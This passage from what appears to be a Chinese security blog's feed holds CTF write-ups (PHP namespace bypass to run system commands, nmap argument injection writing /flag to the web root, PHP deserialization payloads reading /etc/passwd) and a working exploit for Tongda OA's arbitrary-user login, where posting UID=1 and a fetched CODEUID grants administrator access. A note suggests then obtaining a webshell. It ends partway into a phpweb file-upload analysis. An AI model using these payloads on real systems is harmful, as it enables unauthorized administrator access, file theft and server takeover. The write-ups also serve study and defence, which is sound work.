a"</span>;</div><div class="line">    <span class="keyword">var</span> $func = <span class="string">"date"</span>;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">""</span>) &#123;</div><div class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">$func = $_REQUEST[<span class="string">"func"</span>];</div><div class="line">$p = $_REQUEST[<span class="string">"p"</span>];    </div><div class="line"></div><div class="line"><span class="keyword">if</span> ($func != <span class="keyword">null</span>) &#123;</div><div class="line">    $func = strtolower($func);</div><div class="line">    <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</div><div class="line">        <span class="keyword">echo</span> gettime($func, $p);</div><div class="line">    &#125;<span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"Hacker..."</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>发现在代码层设置了<code>disable_function</code>，里面过滤了很多函数，而且要求执行结果返回的类型为字符串才能输出，这里很容易能想到之前做过的P牛星球的<code>Code-Breaking Puzzles挑战</code>,通过php命名空间进行绕过,原理方面，直接贴出之前的笔记,当然，前提要求是php7<br><img src="http://pic.c1imber.top/blog/20200517/lJWxnT4Jbfur.png?imageslim" alt="mark"></p><p>所以这里可以使用<code>\system</code>直接绕过，获取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">func=\system&amp;p=find / -name *flag*</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200517/5e34cxGbtmVW.png?imageslim" alt="mark"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">func=\system&amp;p=cat /tmp/flag_c6bf23b35ba2</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200517/AK1W7XjoMXks.png?imageslim" alt="mark"></p><p><code>\phpinfo</code>查看环境，发现就是php7,所以这样就能直接秒了，不知道有没有其它解法==<br><img src="http://pic.c1imber.top/blog/20200517/xdSxJ7zuWg4S.png?imageslim" alt="mark"></p><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>应该是考察nmap的命令？？？<br>题目已经告诉flag在根目录了，直接输入<code>127.0.0.1&#39; -iL /flag -oN /var/www/html/aaa.txt 127.0.0.1</code>，读取<code>/flag</code>写入网站根目录，访问就能获取flag了<br><img src="http://pic.c1imber.top/blog/20200517/7strEvtiNk3u.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/20200517/JFMpgY8B1hjB.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;phpweb&quot;&gt;&lt;a href=&quot;#phpweb&quot; class=&quot;headerlink&quot; title=&quot;phpweb&quot;&gt;&lt;/a&gt;phpweb&lt;/h3&gt;&lt;p&gt;打开页面查看源码，发现有个隐藏表单会固定时间自动提交一些参数，如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;htt
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2020网鼎杯青龙组-php反序列化</title>
    <link href="https://c1aysec.github.io/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://c1aysec.github.io/2020/05/10/2020网鼎杯青龙组-php反序列化/</id>
    <published>2020-05-10T08:51:05.550Z</published>
    <updated>2020-05-11T08:08:41.286Z</updated>
    
    <content type="html"><![CDATA[<h3 id="2020网鼎杯青龙组-php反序列化"><a href="#2020网鼎杯青龙组-php反序列化" class="headerlink" title="2020网鼎杯青龙组-php反序列化"></a>2020网鼎杯青龙组-php反序列化</h3><p>赛后拿到了题目的源码，搭到本地做了一遍，今天不比赛，先试试题目难度~</p><p>题目代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</div><div class="line"></div><div class="line">highlight_file(<span class="keyword">__FILE__</span>);</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">protected</span> $op;</div><div class="line">    <span class="keyword">protected</span> $filename;</div><div class="line">    <span class="keyword">protected</span> $content;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</div><div class="line">        $op = <span class="string">"1"</span>;</div><div class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</div><div class="line">        $content = <span class="string">"Hello World!"</span>;</div><div class="line">        <span class="keyword">$this</span>-&gt;process();   </div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;write();       </div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</div><div class="line">            $res = <span class="keyword">$this</span>-&gt;read();</div><div class="line">            <span class="keyword">$this</span>-&gt;output($res);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;filename.<span class="keyword">$this</span>-&gt;content;</div><div class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</div><div class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</div><div class="line">                <span class="keyword">die</span>();</div><div class="line">            &#125;</div><div class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</div><div class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</div><div class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</div><div class="line">        $res = <span class="string">""</span>;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</div><div class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> $res;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</div><div class="line">        <span class="keyword">echo</span> $s;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</div><div class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</div><div class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</div><div class="line">        <span class="keyword">$this</span>-&gt;process();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</div><div class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</div><div class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</div><div class="line"></div><div class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</div><div class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</div><div class="line">        $obj = unserialize($str);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>大致过了遍代码，看到这里存在php反序列化,有两条利用链，分别对应文件的读和写操作，具体分析如下：</p><p>首先传入序列化字符串str，反序列化时触发FileHandler类的<code>__destruct</code>方法，这里会对<code>$this-&gt;op</code>的值进行判断，当<code>$this-&gt;op===&quot;2&quot;</code>，会将<code>$this-&gt;op</code>重新赋值为<code>&quot;1&quot;</code>,并将<code>$this-&gt;content</code>赋为空字符串；之后进入<code>process</code>方法，当<code>$this-&gt;op==&quot;1&quot;</code>时，进入<code>write</code>方法，但是由于这里<code>$this-&gt;content</code>的值被赋为了空字符串，所以不能向文件写入任何可控内容，导致“写”这一条利用链不能利用，所以要想办法绕过<code>__destruct</code>当中的判断，进行读文件的利用。</p><p>这里可以将<code>$this-&gt;op</code>的值设置为整型数字2进行绕过，因为在<code>__destruct</code>当中使用<code>===</code>进行了强比较，所以<code>2===&quot;2&quot;</code>结果为False，而在<code>process</code>方法中，使用了<code>==</code>进行比较，由于php弱类型，<code>2==&quot;2&quot;</code>结果为True，进入read函数</p><p>pop链构造如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">protected</span> $op=<span class="number">2</span>;</div><div class="line">    <span class="keyword">protected</span> $filename=<span class="string">"/etc/passwd"</span>;</div><div class="line">&#125;</div><div class="line">$a=<span class="keyword">new</span> FileHandler();</div><div class="line"><span class="keyword">echo</span> serialize($a);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>得到payload：<code>O:11:&quot;FileHandler&quot;:2:{s:5:&quot;*op&quot;;i:2;s:11:&quot;*filename&quot;;s:11:&quot;/etc/passwd&quot;;}</code></p><p>直接将上述字符传入str并不能读取成功，这是因为序列化字符串当中protected属性的影响，三种属性对应的序列化字符串格式如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">private:数据类型:属性名长度:&quot;\00类名\00属性名&quot;;数据类型:属性值长度:&quot;属性值&quot;;</div><div class="line">protected:数据类型:属性名长度:&quot;\00*\00属性名&quot;;数据类型:属性值长度:&quot;属性值&quot;;</div><div class="line">public:数据类型:属性名长度:&quot;属性名&quot;;数据类型:属性值长度:&quot;属性值&quot;;</div></pre></td></tr></table></figure><p>所以这里的payload实际上为：<code>O:11:&quot;FileHandler&quot;:2:{s:5:&quot;00*00op&quot;;i:2;s:11:&quot;00*00filename&quot;;s:11:&quot;/etc/passwd&quot;;}</code></p><p>因为存在protected属性，导致序列化字符串当中存在字符00，而在对字符串进行反序列化之前，这里的<code>is_valid</code>函数对字符串当中的字符进行了检查，要求其字符必须为可显示字符(ascii码值32-125)，所以这里要将payload改为:<code>O:11:&quot;FileHandler&quot;:2:{S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;s:11:&quot;/etc/passwd&quot;;}</code>，将s改为S</p><p><code>\00</code>三个字符均符合<code>!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)</code>，所以这里读取成功<br><img src="http://pic.c1imber.top/blog/20200510/71LKiCfOBTXL.png?imageslim" alt="mark"></p><p>然后就可以通过任意文件读取获得flag了</p><p>5月11日补充：</p><p>题目环境buuoj上已经有了，今天看了颖奇L’Amore师傅的博客，对于这道题在这里需要补充几点</p><p>文章链接：<a href="https://www.gem-love.com/websecurity/2322.html?from=timeline&amp;isappinstalled=0" title="第二届“网鼎杯”青龙组WEB部分题目Writeup" target="_blank" rel="external">第二届“网鼎杯”青龙组WEB部分题目Writeup</a></p><p>文章里提到php7.1+版本对属性类型不敏感，所以在构造poc时直接将对象属性类型设为public也能绕过<code>is_valid</code>的检查，导致非预期解</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> $op=<span class="number">2</span>;</div><div class="line">    <span class="keyword">public</span> $filename=<span class="string">"/etc/passwd"</span>;</div><div class="line">&#125;</div><div class="line">$a=<span class="keyword">new</span> FileHandler();</div><div class="line"><span class="keyword">echo</span> serialize($a);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>payload:<code>O:11:&quot;FileHandler&quot;:2:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:11:&quot;/etc/passwd&quot;;}</code></p><p><img src="http://pic.c1imber.top/blog/20200511/Dr6rhw6oKEEs.png?imageslim" alt="mark"></p><p>另外需要注意的是，这里如果使用相对路径的话有可能会失败，原因在文章里也说了，在执行完序列化字符串后，如果没有出现异常就会穿越到根目录，导致读取不到flag.php，在本地环境<code>var_dump</code>一下<code>scandir(&quot;.&quot;)</code>和<code>$res</code>可以看到反序列化后跳到了根目录，获取<code>/flag.php</code>为<code>false</code>（本地php版本：7.0.33）</p><p>payload：<code>O:11:&quot;FileHandler&quot;:2:{S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;s:8:&quot;flag.php&quot;;}</code></p><p><img src="http://pic.c1imber.top/blog/20200511/kVLhM0tKsVHn.png?imageslim" alt="mark"></p><p>当使用相对路径读取失败时，可以尝试使用以下几种解法：</p><p>方法一：使用绝对路径，需要获取网站根目录，可以从apache配置文件当中获取跟目录，默认配置下，可以从<code>/etc/apache2/sites-available/000-default.conf</code>当中获取网站根目录</p><p>payload:<code>O:11:&quot;FileHandler&quot;:2:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:45:&quot;/etc/apache2/sites-available/000-default.conf&quot;;}</code></p><p><img src="http://pic.c1imber.top/blog/20200511/XSHqAV3BijwP.png?imageslim" alt="mark"></p><p>可以看到buuoj上这道题的环境没有修改根目录,所以直接读取<code>/var/www/html/flag.php</code>即可</p><p>payload:<code>O:11:&quot;FileHandler&quot;:2:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:22:&quot;/var/www/html/flag.php&quot;;}</code></p><p><img src="http://pic.c1imber.top/blog/20200511/7CAAH2Oy1nvE.png?imageslim" alt="mark"></p><p>而在比赛环境当中是修改了网站的根目录的，而且apache网站配置文件也不是上面说的那个，需要通过<code>/proc/self/cmdline</code>才能获取到网站的根目录</p><p>方法二：在反序列化字符串时触发异常，这样就不会跳转到根目录了</p><p>当序列化字符串当中属性个数大于实际个数时，就会触发异常，所以把payload修改为<code>O:11:&quot;FileHandler&quot;:3:{S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;s:8:&quot;flag.php&quot;;}</code>即可<br><img src="http://pic.c1imber.top/blog/20200511/M0Uz9TRM2iPU.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/20200511/eLaLY63pbFgg.png?imageslim" alt="mark"></p><p>另外，有一个奇怪的问题，经过测试发现，buuoj的题目环境通过相对路径就可以读取到flag.php，自己的docker环境也是这样（php版本:7.0.33），有点奇怪，不清楚是什么因素决定的，，，，</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;2020网鼎杯青龙组-php反序列化&quot;&gt;&lt;a href=&quot;#2020网鼎杯青龙组-php反序列化&quot; class=&quot;headerlink&quot; title=&quot;2020网鼎杯青龙组-php反序列化&quot;&gt;&lt;/a&gt;2020网鼎杯青龙组-php反序列化&lt;/h3&gt;&lt;p&gt;赛后拿到了题
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>通达OA任意用户登录</title>
    <link href="https://c1aysec.github.io/2020/04/22/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/"/>
    <id>https://c1aysec.github.io/2020/04/22/通达OA任意用户登录/</id>
    <published>2020-04-22T08:46:58.116Z</published>
    <updated>2020-04-24T09:40:29.302Z</updated>
    
    <content type="html"><![CDATA[<h1 id="通达OA任意用户登录"><a href="#通达OA任意用户登录" class="headerlink" title="通达OA任意用户登录"></a>通达OA任意用户登录</h1><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>分析文章：<a href="https://mp.weixin.qq.com/s/yJuLhC1GxkMbGL0mRORIoA" title="安恒信息应急响应中心" target="_blank" rel="external">https://mp.weixin.qq.com/s/yJuLhC1GxkMbGL0mRORIoA</a></p><p>本地测试版本：2017、v11.3,这两个版本，奇怪的是，在这两个版本的源码当中，都没有找到分析文章当中对<code>CODE_LOGIN.$CODEUID</code>进行判断的那块代码</p><p><img src="http://pic.c1imber.top/blog/20200422/KAn7dkt3wP2e.png?imageslim" alt="mark"></p><p>漏洞位置：</p><p>logincheck_code.php<br><img src="http://pic.c1imber.top/blog/20200422/rwElnHfsQSR6.png?imageslim" alt="mark"></p><p>这里<code>$UID</code>可控，当<code>$_POST[&#39;UID&#39;]</code>为1时，会直接从数据库USER表查询查询系统管理员的信息，然后直接将结果直接赋值给<code>$_SESSION</code>变量，获取系统管理员登录权限（缺少对<code>CODE_LOGIN.$CODEUID</code>的判断,导致直接POST传入UID=1即可获取系统管理员登录权限）</p><p><img src="http://pic.c1imber.top/blog/20200422/Si49nYzoD0Wy.png?imageslim" alt="mark"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">xxx/logincheck_code.php</div><div class="line"></div><div class="line">POST:UID=1</div><div class="line"></div><div class="line">之后访问xxx/general/index.php即可获取系统管理员权限</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200422/AHJdAEDlkH6Y.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200422/o8zdvzknmwjW.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200422/xbCnkhHk3VoW.png?imageslim" alt="mark"></p><h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>访问xxx/logincheck_code.php，若返回<code>{&quot;status&quot;:1,&quot;msg&quot;:&quot;&quot;,&quot;url&quot;:&quot;general\/index.php?isIE=0&quot;}</code>的信息，基本可以确定存在漏洞<br><img src="http://pic.c1imber.top/blog/20200422/wfoUXXGfK0qe.png?imageslim" alt="mark"></p><p>影响范围还是挺大的，当进入后台后，可以在后台数据库管理的位置通过general_log获取网站的webshell</p><p>网站根目录的获取：系统管理-&gt;系统参数设置-&gt;OA服务设置</p><h3 id="2020-4-24补充"><a href="#2020-4-24补充" class="headerlink" title="2020.4.24补充"></a>2020.4.24补充</h3><p>终于下载到了通达OAv11.4版本：<a href="https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe" title="下载链接" target="_blank" rel="external">下载链接</a></p><p>查看漏洞位置logincheck_code.php,对比之前分析的v11.3和2017版本，可以看到增加了对<code>CODE_LOGIN.$CODEUID</code>的判断:<br><img src="http://pic.c1imber.top/blog/20200424/uvUkptTOx2mB.png?imageslim" alt="mark"></p><p>当<code>$login_codeuid = TD::get_cache(&quot;CODE_LOGIN&quot; . $CODEUID);</code>不存在或者为空时，会输出<code>{&quot;status&quot;:0,&quot;msg&quot;:&quot;参数错误&quot;,&quot;url&quot;:&quot;general\/index.php?isIE=0&quot;}</code>并退出程序，所以这里如果想登录，除了需要POST传入UID=1以外，还需要传入<code>CODEUID</code></p><p>全局查找<code>CODE_LOGIN</code>，在general/login_code.php当中，程序通过<code>$login_codeuid = getUniqid();</code>生成了<code>CODE_LOGIN</code>存入了缓存并输出<br><img src="http://pic.c1imber.top/blog/20200424/d0LKr0OdhY3L.png?imageslim" alt="mark"></p><p>这里就可以通过直接访问general/login_code.php获取缓存当中的<code>CODE_LOGIN</code>,通过获取到的<code>CODE_LOGIN</code>绕过logincheck_code.php的判断，获取系统管理员的登录权限</p><h3 id="v11-4版本漏洞检测及利用"><a href="#v11-4版本漏洞检测及利用" class="headerlink" title="v11.4版本漏洞检测及利用"></a>v11.4版本漏洞检测及利用</h3><p>直接访问logincheck_code.php，如果返回<code>{&quot;status&quot;:0,&quot;msg&quot;:&quot;\u53c2\u6570\u9519\u8bef\uff01&quot;,&quot;url&quot;:&quot;general\/index.php?isIE=0&quot;}</code>,则说明有可能存在漏洞</p><p>请求/general/login_code.php,获取codeuid<br><img src="http://pic.c1imber.top/blog/20200424/769EytU6Glfn.png?imageslim" alt="mark"></p><p>访问logincheck_code.php，POST传入UID=1和CODEUID=获取到的codeuid,即可获取系统管理员的登录权限<br><img src="http://pic.c1imber.top/blog/20200424/FciVx00ABsob.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200424/C4tSEqmgvdDY.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;通达OA任意用户登录&quot;&gt;&lt;a href=&quot;#通达OA任意用户登录&quot; class=&quot;headerlink&quot; title=&quot;通达OA任意用户登录&quot;&gt;&lt;/a&gt;通达OA任意用户登录&lt;/h1&gt;&lt;h3 id=&quot;漏洞分析&quot;&gt;&lt;a href=&quot;#漏洞分析&quot; class=&quot;head
      
    
    </summary>
    
      <category term="漏洞分析" scheme="https://c1aysec.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://c1aysec.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>phpweb前台任意文件上传</title>
    <link href="https://c1aysec.github.io/2020/01/10/phpweb%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>https://c1aysec.github.io/2020/01/10/phpweb前台任意文件上传/</id>
    <published>2020-01-09T16:07:20.714Z</published>
    <updated>2020-01-09T16:41:55.965Z</updated>
    
    <content type="html"><![CDATA[<h1 id="phpweb前台任意文件上传"><a href="#phpweb前台任意文件上传" class="headerlink" title="phpweb前台任意文件上传"></a>phpweb前台任意文件上传</h1><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>存在漏洞的代码位置：</p><p>/base/appplus.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//密钥校验</span></div><div class="line">$k=md5(strrev($dbUser.$dbPass));</div><div class="line">$h=$_SERVER[<span class="string">"HTTP_REFERER"</span>];</div><div class="line">$t=$_POST[<span class="string">"t"</span>];</div><div class="line">$m=$_POST[<span class="string">"m"</span>];</div><div class="line">$act=$_POST[<span class="string">"act"</span>];</div><div class="line">$path=$_POST[<span class="string">"path"</span>];</div><div class="line"></div><div class="line">$md5=md5($k.$t);</div><div class="line"><span class="keyword">if</span>($m!=$md5)&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"ERROR: 安全性校验错误"</span>;</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//文件上传</span></div><div class="line"><span class="keyword">if</span>($act==<span class="string">"upload"</span>)&#123;</div><div class="line"></div><div class="line">$file=$_FILES[<span class="string">"file"</span>];</div><div class="line">$r_size=$_POST[<span class="string">"r_size"</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"ERROR"</span>] &gt; <span class="number">0</span>)&#123;</div><div class="line">  <span class="keyword">echo</span> <span class="string">"ERROR:"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"ERROR"</span>].<span class="string">"&lt;br /&gt;"</span>;</div><div class="line">  <span class="keyword">exit</span>;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">if</span>($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>]!=$r_size)&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"ERROR:上传文件错误，文件大小和原文件不匹配"</span>;</div><div class="line">@write_log(<span class="string">"app.log"</span>,date(<span class="string">"Y-m-d H:i:s"</span>,time()).<span class="string">" ERROR: 上传文件错误，文件大小和原文件不匹配\n"</span>,FILE_APPEND);</div><div 